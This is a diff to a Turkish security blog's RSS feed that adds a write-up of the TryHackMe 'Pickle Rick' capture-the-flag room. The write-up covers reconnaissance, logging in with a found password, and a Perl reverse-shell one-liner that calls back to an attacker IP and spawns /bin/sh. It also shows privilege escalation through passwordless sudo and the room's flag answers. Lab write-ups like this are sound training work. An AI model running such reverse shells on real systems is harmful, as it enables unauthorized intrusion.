@@ -1,4 +1,78 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on 0xdak</title><link>/posts/</link><description>Recent content in Posts on 0xdak</description><generator>Hugo -- gohugo.io</generator><language>tr</language><lastBuildDate>Fri, 08 Apr 2022 19:22:53 +0300</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>A2 2017 - Broken Authentication | Türkçe Çeviri</title><link>/posts/a2-2017-5c716/</link><pubDate>Fri, 08 Apr 2022 19:22:53 +0300</pubDate><guid>/posts/a2-2017-5c716/</guid><description>Bu içerik, OWASP topluluğunun 2017 senesinde en çok karşılaşılan açıkları bir puana göre sıraladığı ilk 10 listede 2. sırada gelen, OWASP&amp;rsquo;ın kendi sitesinde açıkladığı Broken Authentication açığının Türkçe çevirisidir.
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on 0xdak</title><link>/posts/</link><description>Recent content in Posts on 0xdak</description><generator>Hugo -- gohugo.io</generator><language>tr</language><lastBuildDate>Sun, 10 Apr 2022 16:10:00 +0300</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>TryHackMe | Pickle Rick Write-Up</title><link>/posts/tryhackme-32bed/</link><pubDate>Sun, 10 Apr 2022 16:10:00 +0300</pubDate><guid>/posts/tryhackme-32bed/</guid><description>Bu içerik TryHackMe platformundaki PickleRick CTF’inin çözümünü içerir. Çözmek isteyenler için: https://tryhackme.com/room/picklerick
+Bu Rick and Morty temalı challenge, Rick’in kendini turşudan insana geri döndürmesi için yapılacak iksirin 3 malzemesini bir web sunucusunun zaafiyetlerinden yararlanarak elde etmeyi gerektirir.
+Daha önceden çözdüğüm başka bir keyifli Rick and Morty temalı CTF daha önereceğim:
+https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/
+Makineyi başlatıyorum.
+Hedef siteye gittiğimizde bizi Rick’in istifralarıyla dolu cümleleri karşılıyor.
+Rick bizden iksirin malzemelerini bulmamız için bilgisayarına girmemiz gerektiğini ama parolasını hatırlamadığını söylüyor.</description><content>&lt;p>Bu içerik TryHackMe platformundaki PickleRick CTF’inin çözümünü içerir. Çözmek isteyenler için: &lt;a href="https://tryhackme.com/room/picklerick">https://tryhackme.com/room/picklerick&lt;/a>&lt;/p>
+&lt;p>Bu Rick and Morty temalı challenge, Rick’in kendini turşudan insana geri döndürmesi için yapılacak iksirin 3 malzemesini bir web sunucusunun zaafiyetlerinden yararlanarak elde etmeyi gerektirir.&lt;/p>
+&lt;p>Daha önceden çözdüğüm başka bir keyifli Rick and Morty temalı CTF daha önereceğim:&lt;/p>
+&lt;p>&lt;a href="https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/">https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/&lt;/a>&lt;/p>
+&lt;p>Makineyi başlatıyorum.&lt;/p>
+&lt;p>Hedef siteye gittiğimizde bizi Rick’in istifralarıyla dolu cümleleri karşılıyor.&lt;/p>
+&lt;p>&lt;img src="/img/TryHackMe%20%2032bed/Untitled.png" alt="Untitled">&lt;/p>
+&lt;p>Rick bizden iksirin malzemelerini bulmamız için bilgisayarına girmemiz gerektiğini ama parolasını hatırlamadığını söylüyor.&lt;/p>
+&lt;p>İlk önce bir ipucu var mı diye sayfa kaynağını görüntülüyorum.&lt;/p>
+&lt;p>Altta yorum satırları içinde ipucumuz bizi bekliyor.&lt;/p>
+&lt;pre tabindex="0">&lt;code> &amp;lt;!--
+Note to self, remember username!
+Username: R1ckRul3s
+--&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>Anasayfadaki resmi yeni sekmede açtığımızda nerede depolandığını görüyoruz.&lt;/p>
+&lt;p>/assets/ yoluna gittiğimizde bazı dosyaları görüyorum. Belki ilerde bir reverse shell yükleyebiliriz.&lt;/p>
+&lt;p>F12 ile cookie’lere bakıyorum bir şey bulamıyorum.&lt;/p>
+&lt;p>nmap ile 22 SSH portunun açık olduğunu görüyorum.&lt;/p>
+&lt;p>&lt;img src="/img/TryHackMe%20%2032bed/Untitled%201.png" alt="Untitled">&lt;/p>
+&lt;p>Gobuster ile url’yi tarıyorum.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-jsx" data-lang="jsx">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">gobuster&lt;/span> &lt;span style="color:#a6e22e">dir&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#a6e22e">u&lt;/span> [&lt;span style="color:#a6e22e">https&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75715e">//10-10-4-52.p.thmlabs.com](https://10-10-4-52.p.thmlabs.com/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Gobuster ile ne kadar denesem de bir sonuç alamıyorum.&lt;/p>
+&lt;p>Bunun yerine dirsearch ile tarıyorum ve çıkan sonuçlar:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-jsx" data-lang="jsx">&lt;span style="display:flex;">&lt;span>[&lt;span style="color:#ae81ff">13&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>] &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#a6e22e">KB&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#e6db74">/assets/&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[&lt;span style="color:#ae81ff">13&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">39&lt;/span>] &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#a6e22e">KB&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">/index.html &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[&lt;span style="color:#ae81ff">13&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">42&lt;/span>] &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">882&lt;/span>&lt;span style="color:#a6e22e">B&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">/login.php &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[&lt;span style="color:#ae81ff">13&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">53&lt;/span>] &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">17&lt;/span>&lt;span style="color:#a6e22e">B&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">/robots.txt&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>robots.txt’de Rick anlamsızca &lt;code>Wubbalubbadubdub&lt;/code> diyor.&lt;/p>
+&lt;p>login.php’de önüme bir login ekranı çıkıyor.&lt;/p>
+&lt;p>username’i zaten biliyoruz. Şifre için bir brute-force attack uygulayabiliriz.&lt;/p>
+&lt;p>Burpsuit’in free kısmında zaman sınırlaması konulduğu için hydra kullanmayı tercih ediyorum.&lt;/p>
+&lt;p>hydra’yı birkaç wordlist ile deniyorum ama başarısız sonuç alıyorum.&lt;/p>
+&lt;p>Sonra aklıma anlamsızca dediğim &lt;code>Wubbalubbadubdub&lt;/code> geliyor.&lt;/p>
+&lt;p>Deniyorum ve sonuç başarılı.&lt;/p>
+&lt;p>Şimdilik sadece command panel’i görebiliyorum diğer sayfalara yetkim yok.&lt;/p>
+&lt;p>&lt;img src="/img/TryHackMe%20%2032bed/Untitled%202.png" alt="Untitled">&lt;/p>
+&lt;p>Dizini ls komutuyla listeliyorum ve &lt;code>Sup3rS3cretPickl3Ingred.txt&lt;/code>&amp;lsquo;i cat komutuyla yazdırıyorum ama başarısız.&lt;/p>
+&lt;p>&lt;img src="/img/TryHackMe%20%2032bed/Untitled%203.png" alt="Untitled">&lt;/p>
+&lt;p>Sonra dizin olarak &lt;code>Sup3rS3cretPickl3Ingred.txt&lt;/code>&amp;lsquo;e gitmeyi düşünüyorum ve&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-jsx" data-lang="jsx">&lt;span style="display:flex;">&lt;span>[&lt;span style="color:#a6e22e">http&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75715e">//10.10.4.52/Sup3rS3cretPickl3Ingred.txt](http://10.10.4.52/Sup3rS3cretPickl3Ingred.txt)
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ilk malzememizi buluyorum: &lt;code>mr. meeseek hair&lt;/code>&lt;/p>
+&lt;p>clue.txt’de ipucu var mı diye bakıyorum.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-jsx" data-lang="jsx">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">Look&lt;/span> &lt;span style="color:#a6e22e">around&lt;/span> &lt;span style="color:#a6e22e">the&lt;/span> &lt;span style="color:#a6e22e">file&lt;/span> &lt;span style="color:#a6e22e">system&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#a6e22e">the&lt;/span> &lt;span style="color:#a6e22e">other&lt;/span> &lt;span style="color:#a6e22e">ingredient&lt;/span>.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>portal.php’in kaynak html kodunda yorum satırında bir şey buluyorum.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-jsx" data-lang="jsx">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0&lt;/span>&lt;span style="color:#f92672">==&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Sondaki eşittirleri silip cyberchef’te base64’ten çeviriyorum ve bir kaç kez dönen sonucu yaptıktan sonra ortaya çıkan deşifre:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-jsx" data-lang="jsx">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">rabbit&lt;/span> &lt;span style="color:#a6e22e">hole&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>“ls /home” komutunu girince iki tane kullanıcı karşıma çıkıyor:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-jsx" data-lang="jsx">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">rick&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">ubuntu&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>“ls /home/rick” komutunu girince ikinci malzemenin burada olduğunu anlıyorum.&lt;/p>
+&lt;p>“cp /home/rick/* .” komutu ile dosyayı buraya kopyalamaya çalışıyorum ama olmuyor.&lt;/p>
+&lt;p>cat komutu çalışmıyor bunun yerine less komutunu deniyorum, dosyanın içeriğini görüntülüyorum ve ikinci malzememiz: &lt;code>1 jerry tear&lt;/code>&lt;/p>
+&lt;p>Artık reverse shell ile komut satırına geçmenin zamanıdır diye düşünüyorum ve internette bash ile reverse shell oluşturabilecek kod parçası arıyorum.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-jsx" data-lang="jsx">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">perl&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#e6db74">&amp;#39;use Socket;$i=&amp;#34;10.8.52.245&amp;#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Deniyorum ve işe yarıyor.&lt;/p>
+&lt;p>&lt;img src="/img/TryHackMe%20%2032bed/Untitled%204.png" alt="Untitled">&lt;/p>
+&lt;p>find / -perm -u=s -type f 2&amp;gt;/dev/null komutuyla sudo’ya yetkisi olan dosyaları listeliyoruz.&lt;/p>
+&lt;p>Burdan da bize ekmek çıkmıyor.&lt;/p>
+&lt;p>sudo komutundan ilerliyorum. sudo -l komutuyla aldığım çıktıyla anlıyorum ki www-data kullanıcısı sudo komutunu şifresiz istediği yerde kullanabilir.&lt;/p>
+&lt;p>&lt;img src="/img/TryHackMe%20%2032bed/Untitled%205.png" alt="Untitled">&lt;/p>
+&lt;p>Finallerin /root’da olacağı aklıma geliyor&lt;/p>
+&lt;p>“sudo ls /root/” ile listeliyorum.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-jsx" data-lang="jsx">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#a6e22e">rd&lt;/span>.&lt;span style="color:#a6e22e">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">snap&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>“sudo cat /root/3rd.txt”&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-jsx" data-lang="jsx">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#a6e22e">rd&lt;/span> &lt;span style="color:#a6e22e">ingredients&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">fleeb&lt;/span> &lt;span style="color:#a6e22e">juice&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ve son malzememiz: &lt;code>fleeb juice&lt;/code>&lt;/p>
+&lt;p>Yazdığım içeriği okuduğunuz için teşekkür ederim. İyi çalışmalar.&lt;/p></content></item><item><title>A2 2017 - Broken Authentication | Türkçe Çeviri</title><link>/posts/a2-2017-5c716/</link><pubDate>Fri, 08 Apr 2022 19:22:53 +0300</pubDate><guid>/posts/a2-2017-5c716/</guid><description>Bu içerik, OWASP topluluğunun 2017 senesinde en çok karşılaşılan açıkları bir puana göre sıraladığı ilk 10 listede 2. sırada gelen, OWASP&amp;rsquo;ın kendi sitesinde açıkladığı Broken Authentication açığının Türkçe çevirisidir.
 Orijinal yazıyı okumak isteyenler için link:
 https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication.html
 Anlamını bilmediğiniz veya benim Türkçe&amp;rsquo;ye bilerek çevirmediğim terimlerin anlamı için, belki bulmak umuduyla, kendi dilimde açıkladığım terimler sayfasına gidebilirsiniz.
